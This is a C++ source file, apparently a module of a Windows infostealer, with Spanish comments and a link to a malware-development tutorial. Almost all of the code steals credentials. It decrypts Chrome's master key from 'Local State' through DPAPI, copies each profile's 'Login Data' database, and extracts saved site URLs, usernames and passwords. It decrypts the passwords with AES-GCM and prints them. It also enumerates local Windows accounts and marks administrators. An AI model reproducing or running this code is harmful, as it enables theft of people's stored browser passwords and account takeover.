#include "mod_info.hpp"
#include "misc.hpp"

static int callback(void* NotUsed, int argc, char** argv, char** azColName)
{
	int i;
	for (i = 0; i < argc; i++)
	{
		printf("%s = %s\n", azColName[i], argv[i] ? argv[i] : "NULL");
	}
	printf("\n");
	return 0;
}

void mod_Info::test_Data() {
	//std::cout << "USUARIOS:\n";
	//for (std::string user : this->m_Usuarios()) {
	//	std::cout << user << "\n";
	//}
	//
	std::cout << "CHROME PROFILES DUMP_TEST:\n";
	for (Chrome_Profile profile : this->m_ChromeProfiles()) {
		//std::cout << "\nPATH: " << profile.strPath << "\n";
		std::string Login_Path = profile.strPath + "Login Data";
		std::cout << "\nNAME: " << profile.strName << "\n";
		std::cout << "GAIA_NAME: " << profile.strGaiaName << "\n";
		std::cout << "SHORTCUT_NAME: " << profile.strShortCutName << "\n";
		std::cout << "USERNAME: " << profile.strUserName << "\n";
		std::cout << "HOSTED_DOMAIN: " << profile.strHostedDomain << "\nPASSWORDS FOR THIS PROFILE:\n";
		this->test_SimplePassDump(Login_Path);
	}

}

//https://github.com/oomar400/Malware-Development/tree/main/Malware101%3AInfostealers
std::string mod_Info::m_DecryptLogin(const std::string& strPass) {
	std::string strOut = "";
	BCRYPT_ALG_HANDLE hAlgorithm = 0;
	BCRYPT_KEY_HANDLE hKey       = 0;
	NTSTATUS nStatus             = 0;

	size_t encSize   = strPass.size();
	size_t tagOffset =   encSize - 15;
	ULONG uPlainSize =              0;

	std::vector<BYTE> vc_CipherPass(encSize);
	std::vector<BYTE> vc_Plain;
	std::vector<BYTE> IV(12);

	memcpy(IV.data(), strPass.data() + 3, 12);
	memcpy(vc_CipherPass.data(), strPass.data() + 15, encSize - 15);

	nStatus = BCryptOpenAlgorithmProvider(&hAlgorithm, BCRYPT_AES_ALGORITHM, NULL, 0);
	if (!BCRYPT_SUCCESS(nStatus)) {
		__DBG_("BCryptOpenAlgorithmProvider error");
		__DBG_(nStatus);
		return strOut;
	}

	nStatus = BCryptSetProperty(hAlgorithm, BCRYPT_CHAINING_MODE, (UCHAR*)BCRYPT_CHAIN_MODE_GCM, sizeof(BCRYPT_CHAIN_MODE_GCM), 0);
	if (!BCRYPT_SUCCESS(nStatus)) {
		__DBG_("BCryptSetProperty error");
		__DBG_(nStatus);
		BCryptCloseAlgorithmProvider(hAlgorithm, 0);
		return strOut;
	}

	DATA_BLOB MasterKey;
	MasterKey.cbData = this->vcChromeKey.size();
	MasterKey.pbData = this->vcChromeKey.data();
	nStatus = BCryptGenerateSymmetricKey(hAlgorithm, &hKey, NULL, 0, MasterKey.pbData, MasterKey.cbData, 0);
	if (!BCRYPT_SUCCESS(nStatus)) {
		__DBG_(GetLastError());
		__DBG_("BCryptGenerateSymmetricKey error");
		__DBG_(nStatus);
		BCryptCloseAlgorithmProvider(hAlgorithm, 0);
		return strOut;
	}

	BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO authInfo;
	BCRYPT_INIT_AUTH_MODE_INFO(authInfo);
	tagOffset -= 16;
	authInfo.pbNonce = IV.data();
	authInfo.cbNonce = 12;
	authInfo.pbTag = vc_CipherPass.data() + tagOffset;
	authInfo.cbTag = 16;

	if (tagOffset < 0) {
		__DBG_("Error parseando el offset");
	} else {

		nStatus = BCryptDecrypt(hKey, vc_CipherPass.data(), tagOffset, &authInfo, NULL, 0, NULL, NULL, &uPlainSize, 0);
		if (!BCRYPT_SUCCESS(nStatus)) {
			__DBG_("BCryptDecrypt_1 error");
			__DBG_(nStatus);
			BCryptCloseAlgorithmProvider(hAlgorithm, 0);
			return strOut;
		}

		vc_Plain.resize(uPlainSize);

		nStatus = BCryptDecrypt(hKey, vc_CipherPass.data(), tagOffset, &authInfo, NULL, 0, vc_Plain.data(), uPlainSize, &uPlainSize, 0);
		if (!BCRYPT_SUCCESS(nStatus)) {
			__DBG_("BCryptDecrypt_2 error");
			__DBG_(nStatus);
			BCryptCloseAlgorithmProvider(hAlgorithm, 0);
			return strOut;
		}
	}
	
	BCryptCloseAlgorithmProvider(hAlgorithm, 0);

	strOut = std::string(vc_Plain.begin(), vc_Plain.end());

	return strOut;
}

std::string mod_Info::m_Decrypt(const std::string& strPass) {
	DATA_BLOB encryptedPass, decryptedPass;
	std::string strOut = "";

	encryptedPass.cbData = (DWORD)strPass.size();
	encryptedPass.pbData = (byte*)malloc((int)encryptedPass.cbData);

	memcpy(encryptedPass.pbData, strPass.c_str(), (int)encryptedPass.cbData);
	
	if (!::CryptUnprotectData(
		&encryptedPass, // In Data
		NULL,			// Optional ppszDataDescr: pointer to a string-readable description of the encrypted data 
		NULL,           // Optional entropy
		NULL,           // Reserved
		NULL,           // Here, the optional
		// prompt structure is not
		// used.
		0,
		&decryptedPass)) {
		__DBG_("Error desencriptando la password");
		__DBG_(GetLastError());
	}else {
		strOut = reinterpret_cast<const char*>(decryptedPass.pbData);
	}
	
	free(encryptedPass.pbData);
	encryptedPass.pbData = NULL;

	return strOut;
}

void mod_Info::test_SimplePassDump(const std::string& strUserPath) {
	std::string randomR = RandomID(6);
	if (::CopyFileA((LPCSTR)strUserPath.c_str(), (LPCSTR)randomR.c_str(), FALSE)) {
		sqlite3* db;
		
		int iRet = sqlite3_open(randomR.c_str(), &db);

		if (iRet == SQLITE_OK) {
			const char* cQuery = "SELECT origin_url, action_url, username_value, password_value FROM logins;";
			sqlite3_stmt* pStmt;

			iRet = sqlite3_prepare(db, cQuery, -1, &pStmt, 0);
			if (iRet == SQLITE_OK) {
				iRet = sqlite3_step(pStmt);
				while (iRet == SQLITE_ROW) {
					if (sqlite3_column_bytes(pStmt, 3) > 0 && sqlite3_column_bytes(pStmt, 2) > 0) {
						std::cout << "O_URL: " << sqlite3_column_text(pStmt, 0) << "\n";
						std::cout << "A_URL: " << sqlite3_column_text(pStmt, 1) << "\n";
						std::cout << "USER: " << sqlite3_column_text(pStmt, 2) << "\n";
						std::string temp_Pass = reinterpret_cast<const char*>(sqlite3_column_text(pStmt, 3));
						std::cout << "PASS: " <<this->m_DecryptLogin(temp_Pass) << "\n";
					}
					iRet = sqlite3_step(pStmt);
				}
			}
			sqlite3_finalize(pStmt);
		}

		
		sqlite3_close(db);

		DeleteFile((LPCSTR)randomR.c_str());
	}else {
		std::cout << "No se puco copiar la bd del usuario: " << GetLastError() << "\n";
	}
}

void mod_Info::test_SQL(){
	sqlite3* db;
	char* zErrMsg = 0;
	
	int iRet = sqlite3_open("archivo.sqlite", &db);

	if (iRet != SQLITE_OK) {
		std::cout << "No se pudo abrir el archivo\n";
		sqlite3_close(db);
		return;
	}

	const char* cQuery = "SELECT * FROM usuarios;";
	//iRet = sqlite3_exec(db, cQuery, callback, 0, &zErrMsg);

	sqlite3_stmt* pStmt;

	iRet = sqlite3_prepare(db, cQuery, -1, &pStmt, 0);

	if (iRet != SQLITE_OK) {
		std::cout << "SQL error: " << zErrMsg << "\n";
		sqlite3_free(zErrMsg);
	}else {
		iRet = sqlite3_step(pStmt);
		while (iRet == SQLITE_ROW) {
			std::cout << "NOMBRE: " << sqlite3_column_text(pStmt, 0) << " - ";
			std::cout << "EMAIL: " << sqlite3_column_text(pStmt, 1) << " - ";
			std::cout << "PASSWORD: " << sqlite3_column_text(pStmt, 2) << " \n";
			iRet = sqlite3_step(pStmt);
		}

		sqlite3_finalize(pStmt);
	}

	sqlite3_close(db);

}

std::vector<Chrome_Profile> mod_Info::m_ChromeProfiles() {
	int iBuffSize = 4096;
	std::vector<Chrome_Profile> vcOut;

	LPSTR env_var = (LPSTR)malloc(iBuffSize);
	if (env_var == NULL) {
		__DBG_("No se pudo reservar memoria");
		return vcOut;
	}
	
	if (GetEnvironmentVariable("APPDATA", env_var, iBuffSize) == 0) {
		_DBG_("Error", GetLastError());
		return vcOut;
	}
	
	std::string strPath = env_var;
	
	free(env_var); env_var = NULL;

	std::vector<std::string> vcTemp = strSplit(strPath, '\\', 1024);
	vcTemp.pop_back();
	
	strPath = "";
	for (std::string sub_path : vcTemp) {
		strPath += sub_path + "\\";
	}
	strPath += "Local\\Google\\Chrome\\User Data\\";

	this->strBasePath = strPath;
	
	//copiar archivo que contiene la llave maestra
	std::string strFile = strPath + "Local State";
	if (!::CopyFileA((LPCSTR)strFile.c_str(), "saramambichi", FALSE)) {
		__DBG_("No se pudo copiar el archivo local state");
		__DBG_(GetLastError());
		return vcOut;
	}

	//Leer informacion de perfiles de chrome
	std::ifstream iFile("saramambichi");
	if (iFile.is_open()) {
		nlohmann::json jeyson = nlohmann::json::parse(iFile);
		if (!jeyson.is_null()) {
			//Perfiles
			for (auto& itm : jeyson["profile"]["info_cache"].items()) {
				std::string temp_Path = strPath + itm.key() + "\\";
				Chrome_Profile nProfile;
				nProfile.strPath = temp_Path;
				nProfile.strName         = itm.value()["name"         ];
				nProfile.strGaiaName     = itm.value()["gaia_name"    ];
				nProfile.strShortCutName = itm.value()["shortcut_name"];
				nProfile.strUserName     = itm.value()["user_name"    ];
				nProfile.strHostedDomain = itm.value()["hosted_domain"];
				vcOut.push_back(nProfile);
			}

			//Encrypted key
			std::string strTmp = base64_decode(jeyson["os_crypt"]["encrypted_key"]);
			strTmp = strTmp.substr(5, strTmp.size() - 5);
			strTmp = this->m_Decrypt(strTmp);
			this->vcChromeKey.resize(strTmp.size());
			memcpy(this->vcChromeKey.data(), strTmp.data(), strTmp.size());
		}
	}

	DeleteFile("saramambichi");

	return vcOut;
}

std::vector<std::string> mod_Info::m_Usuarios() {
	std::vector<std::string> vcOut;
	LPUSER_INFO_11 lUsers = nullptr;
	LPUSER_INFO_11 lTmpuser = nullptr;
	DWORD dCount = 0, dHints = 0;
	NET_API_STATUS nStatus;
	do {
		nStatus = NetUserEnum(nullptr, 11, 0, (LPBYTE*)&lUsers, MAX_PREFERRED_LENGTH, &dCount, &dHints, 0);
		if ((nStatus == NERR_Success) || (nStatus == ERROR_MORE_DATA)) {
			if ((lTmpuser = lUsers) != nullptr) {
				for (DWORD i = 0; (i < dCount); i++) {
					if (lUsers == NULL) {
						__DBG_("lUsers = NULL")
						break;
					}
					std::wstring st = lTmpuser->usri11_name;
					std::string strTempUser(st.begin(), st.end());
					if (strTempUser != "") {
						if (lTmpuser->usri11_priv == USER_PRIV_ADMIN) {
							strTempUser += " (ADMIN)";
						}
						vcOut.push_back(strTempUser);
					}
					lTmpuser++;
				}
			}
		}
		if (lUsers != nullptr) {
			NetApiBufferFree(lUsers);
			lUsers = nullptr;
		}
	} while (nStatus == ERROR_MORE_DATA);
	if (lUsers != nullptr) {
		NetApiBufferFree(lUsers);
		lUsers = nullptr;
	}
	return vcOut;
}